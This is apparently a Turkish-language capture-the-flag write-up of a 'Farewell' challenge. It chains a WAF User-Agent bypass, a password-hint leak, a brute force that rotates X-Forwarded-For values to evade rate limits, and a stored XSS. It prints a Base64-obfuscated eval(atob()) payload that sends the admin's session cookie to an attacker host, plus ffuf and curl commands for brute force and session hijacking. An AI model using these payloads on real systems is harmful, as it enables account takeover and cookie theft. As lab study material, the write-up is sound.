Sunucular 24 saat içinde kapatılacak, herkesten son bir veda mesajı isteniyor — ama mesajları sadece admin paneli görebiliyor. Önümüzde bir ModSecurity WAF var ve hedef, önce normal bir kullanıcı olarak, sonra da admin olarak içeri sızmak.

| Hedef | Kategori |
|---|---|
| Farewell dashboard (auth.php / admin.php) | WAF Bypass / Brute Force / Stored XSS |

**Zincir:** `check.js` üzerinden gerçek login endpoint'ini (`/auth.php`) bulmak → WAF'ın `curl` gibi bot User-Agent'larını blokladığını fark edip tarayıcı header'larıyla geçmek → başarısız login cevaplarının kullanıcı bazlı **şifre ipucu** sızdırdığını keşfetmek → `deliver11` için "Tokyo + 4 rakam" ipucunu, WAF'ın rate-limit'ini **`X-Forwarded-For` rotasyonuyla** atlatarak brute force etmek → normal kullanıcı flag'i → dashboard'daki mesaj kutusuna filtre-bypass'lı bir **stored XSS** enjekte edip admin'in session cookie'sini çalmak → çalınan `PHPSESSID` ile `admin.php`'ye admin olarak erişmek → admin flag'i.

## 01 — Keşif ve login akışının çözülmesi

Ana sayfa statik bir ticker ile üç kullanıcı adı gösteriyordu: `adam`, `deliver11`, `nora`. Sayfa kaynağında görünür bir form action yoktu, submit işlemi `check.js` üzerinden yapılıyordu:

```js
const res = await fetch('/auth.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: form.toString(),
});
```

Gobuster ile dizin taraması `info.php` (phpinfo — `mod_security2` yüklü olduğunu doğruladı), `status.php` ve korumalı `admin.php` / `auth.php` yollarını ortaya çıkardı:

```text
admin.php    (Status: 403)
auth.php     (Status: 403)
dashboard.php (Status: 302) [--> /]
info.php     (Status: 200)
status.php   (Status: 200)
```

![Farewell login ekranı](/assets/img/posts/farewell-login.png)

## 02 — WAF'ın ilk katmanı: User-Agent filtresi

`curl`'ün varsayılan header'larıyla `auth.php`'ye atılan **her** istek — geçerli kimlik bilgileriyle bile — 403 ile karşılandı:

```text
HTTP/1.1 403 Forbidden
... Sorry, you don't have permission to access this page. WAF is Active
```

Tarayıcı gibi görünen bir `User-Agent`, `Origin` ve `Referer` eklenince istek düzgün şekilde geçti ve gerçek JSON cevabı geldi:

```json
{"error":"auth_failed"}
```

## 03 — Şifre ipuçları sızıntısı

Geçerli bir kullanıcı adıyla (yanlış şifreyle) denendiğinde, sunucu doğrulama başarısız olsa bile bir `password_hint` alanı döndürüyordu:

```json
{"error":"auth_failed","user":{"name":"deliver11","last_password_change":"2025-09-10 11:00:00","password_hint":"Capital of Japan followed by 4 digits"}}
```

Üç kullanıcı için üç farklı ipucu çıktı — `adam`: *favorite pet + 2*, `nora`: *lucky number 789*, `deliver11`: *Capital of Japan followed by 4 digits*. Sonuncusu net bir formatı olduğu (Tokyo + 4 haneli sayı = 10.000 ihtimal) için brute force için en uygun hedefti.

## 04 — Rate-limit'i X-Forwarded-For rotasyonuyla atlatmak

`Tokyo0000`–`Tokyo9999` aralığını denemeye başlayınca ilk birkaç istekten sonra WAF yine 403 atmaya başladı — bu sefer içerikten değil, **istek sıklığından** kaynaklanan bir rate-limit banıydı. Sabit bir `X-Forwarded-For: 127.0.0.1` eklemek admin.php'nin IP tabanlı korumasını atlatsa da, aynı sahte IP'yi binlerce istek boyunca tekrar kullanmak sonunda o IP'yi de banlatıyordu.

Çözüm, **her isteğe farklı bir sahte IP** atamaktı (`127.0.x.y` aralığında dönen bir liste), böylece rate-limit sayacı hiçbir tek değerde birikmiyordu. `ffuf`'un `pitchfork` modu (iki wordlist'i satır satır eşleştirme — wfuzz'daki `-m zip` karşılığı) ile şifre listesini IP listesiyle eşleştirdim:

```bash
ffuf -u http://$IP/auth.php -X POST \
  -H "User-Agent: Mozilla/5.0 ..." \
  -H "X-Forwarded-For: IPFUZZ" \
  -d "username=deliver11&password=PASSFUZZ" \
  -w tokyo_passwords.txt:PASSFUZZ \
  -w rotating_ips.txt:IPFUZZ \
  -mode pitchfork -fr "auth_failed" -t 15
```

```text
[Status: 200, Size: 45, Words: 1, Lines: 1]
    * IPFUZZ: 127.0.3.249
    * PASSFUZZ: Tokyo1010
```

`deliver11 / Tokyo1010` ile giriş yapılınca dashboard'da normal kullanıcı flag'i göründü:

![deliver11 olarak dashboard — normal kullanıcı flag'i (blurlanmış)](/assets/img/posts/farewell-user-flag.png)

## 05 — Stored XSS ile admin'in oturumunu çalmak

Dashboard, onaya gönderilen bir "veda mesajı" formu sunuyordu — admin bu mesajları inceliyor. Klasik `<img onerror=...>` / `fetch(` / `document.cookie` payload'ları WAF/filtre tarafından direkt reddedildi. Filtre düz metinde belirli anahtar kelimeleri arıyordu; çözüm payload'ı **Base64'e gizleyip** `eval(atob())` ile çalıştırmaktı:

```bash
echo -n "fetch('//<attacker-ip>:8000/'+document.cookie)" | base64
# ZmV0Y2goJy8vPGF0dGFja2VyLWlwPjo4MDAwLycrZG9jdW1lbnQuY29va2llKQ==
```

```html
<body onload="eval(atob('ZmV0Y2goJy8vPGF0dGFja2VyLWlwPjo4MDAwLycrZG9jdW1lbnQuY29va2llKQ=='))">
```

Filtre, Base64 string içinde `fetch`/`document.cookie` kelimelerini göremediği için payload onaylanıp admin panelinde render edildi:

![Base64 + eval(atob()) payload'ı mesaj kutusunda (flag blurlanmış)](/assets/img/posts/farewell-xss-payload.png)

Kendi makinemde `python3 -m http.server 8000` ile dinleyici açık haldeyken, admin mesajı görüntüleyince tarayıcısı istek attı ve session cookie'si düştü:

```text
GET /PHPSESSID=<redacted-session-id> HTTP/1.1
```

## 06 — Session hijacking ile admin.php

Çalınan `PHPSESSID` değerini kendi isteğime `-b` ile ekleyip (yine `X-Forwarded-For: 127.0.0.1` ile IP tabanlı korumayı da atlatarak) `admin.php`'ye gittim:

```bash
curl -s http://$IP/admin.php \
  -H "X-Forwarded-For: 127.0.0.1" \
  -b "PHPSESSID=<redacted-session-id>"
```

Cevap artık login formu değil, doğrudan **admin panelini** — onaylanmış mesaj listesini ve admin flag'ini döndürdü.

## Özet — Öğrenilen teknikler

- **WAF'lar genelde iki katmanlı çalışır:** biri User-Agent/imza tabanlı bot filtresi, diğeri IP bazlı rate-limit. İkisini ayrı ayrı teşhis etmek gerekiyor — biri geçildi diye diğeri de geçilmiş olmuyor.
- **`X-Forwarded-For` bir "trust" header'ıdır, kimlik doğrulaması değil.** WAF bu header'ı gerçek istemci IP'si sanıyorsa, hem IP-tabanlı ACL'leri (admin.php) hem de rate-limit sayaçlarını bu header üzerinden spoof edebilirsiniz — ama sabit bir değer kullanmak, o sahte IP'nin de banlanmasına yol açar; rotasyon şart.
- **Başarısız login cevapları bazen başarıdan daha fazla bilgi sızdırır** — burada `password_hint` alanı doğrudan brute force stratejisini belirledi.
- **Anahtar kelime tabanlı XSS filtreleri, payload'ı çalışma zamanına kadar okunaklı olmaya zorlamaz.** `Base64 + eval(atob())` gibi bir "gecikmeli çözme" tekniği, filtrenin aradığı literal string'leri isteğin gövdesinden tamamen kaldırır.
- **Stored XSS + admin moderasyon paneli = klasik session hijacking zinciri.** Admin'in kendi tarayıcısını bir exfiltration vektörüne çevirmek, doğrudan admin şifresini kırmaktan çoğu zaman daha kısa yoldur.
